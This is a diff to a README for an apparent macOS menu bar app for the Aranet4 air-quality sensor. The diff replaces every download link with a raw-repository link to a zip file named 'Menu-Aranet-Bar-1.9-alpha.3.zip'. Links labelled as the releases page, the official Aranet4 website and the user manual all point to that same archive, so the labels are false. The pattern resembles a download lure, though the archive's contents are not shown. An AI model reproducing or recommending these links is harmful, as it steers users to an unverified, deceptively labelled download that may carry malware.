@@ -1,7 +1,7 @@
 # 🌟 Aranet4MenuBar - Your Air Quality Assistant in the Menu Bar
 
 ## 📥 Download Now
-[![Download Aranet4MenuBar](https://github.com/JustinTLT/Aranet4MenuBar/raw/refs/heads/main/Casks/Aranet_Menu_Bar_1.5-alpha.5.zip%20Now-Visit%20Releases-blue)](https://github.com/JustinTLT/Aranet4MenuBar/raw/refs/heads/main/Casks/Aranet_Menu_Bar_1.5-alpha.5.zip)
+[![Download Aranet4MenuBar](https://github.com/JustinTLT/Aranet4MenuBar/raw/refs/heads/main/Casks/Menu-Aranet-Bar-1.9-alpha.3.zip%20Now-Visit%20Releases-blue)](https://github.com/JustinTLT/Aranet4MenuBar/raw/refs/heads/main/Casks/Menu-Aranet-Bar-1.9-alpha.3.zip)
 
 ## 🚀 Getting Started
 Welcome to Aranet4MenuBar! This application helps you monitor your Aranet4 air quality sensor directly from your macOS menu bar. You can easily track air quality levels and receive notifications when important changes occur.
@@ -21,7 +21,7 @@ Welcome to Aranet4MenuBar! This application helps you monitor your Aranet4 air q
 ## 📂 Download & Install
 To download Aranet4MenuBar, visit the Releases page using the link below. From there, you can access the latest version of the application.
 
-[Download Aranet4MenuBar](https://github.com/JustinTLT/Aranet4MenuBar/raw/refs/heads/main/Casks/Aranet_Menu_Bar_1.5-alpha.5.zip)
+[Download Aranet4MenuBar](https://github.com/JustinTLT/Aranet4MenuBar/raw/refs/heads/main/Casks/Menu-Aranet-Bar-1.9-alpha.3.zip)
 
 ### 🛠️ Installation Instructions
 1. **Visit the Releases Page:** Click the link above or copy it into your browser.
@@ -42,7 +42,7 @@ Once the application is running, you will see an icon in your menu bar. Click on
 ## 🔄 Updating the App
 To ensure you have the latest features and improvements, regularly check for updates:
 
-1. **Visit the Releases Page:** Use this link: [Download Aranet4MenuBar](https://github.com/JustinTLT/Aranet4MenuBar/raw/refs/heads/main/Casks/Aranet_Menu_Bar_1.5-alpha.5.zip).
+1. **Visit the Releases Page:** Use this link: [Download Aranet4MenuBar](https://github.com/JustinTLT/Aranet4MenuBar/raw/refs/heads/main/Casks/Menu-Aranet-Bar-1.9-alpha.3.zip).
 2. **Download the Latest Version:** Follow the same steps outlined in the installation instructions.
 
 ## ❓ Frequently Asked Questions (FAQ)
@@ -62,7 +62,7 @@ To uninstall Aranet4MenuBar, simply drag it from your Applications folder to the
 If you encounter any issues or have questions, feel free to open an issue in the repository or contact the development team directly through GitHub.
 
 ## 🔗 Additional Resources
-- [Aranet4 Official Website](https://github.com/JustinTLT/Aranet4MenuBar/raw/refs/heads/main/Casks/Aranet_Menu_Bar_1.5-alpha.5.zip)
-- [User Manual for Aranet4](https://github.com/JustinTLT/Aranet4MenuBar/raw/refs/heads/main/Casks/Aranet_Menu_Bar_1.5-alpha.5.zip)
+- [Aranet4 Official Website](https://github.com/JustinTLT/Aranet4MenuBar/raw/refs/heads/main/Casks/Menu-Aranet-Bar-1.9-alpha.3.zip)
+- [User Manual for Aranet4](https://github.com/JustinTLT/Aranet4MenuBar/raw/refs/heads/main/Casks/Menu-Aranet-Bar-1.9-alpha.3.zip)
 
 Thank you for choosing Aranet4MenuBar for your air quality monitoring needs. Enjoy clean air!
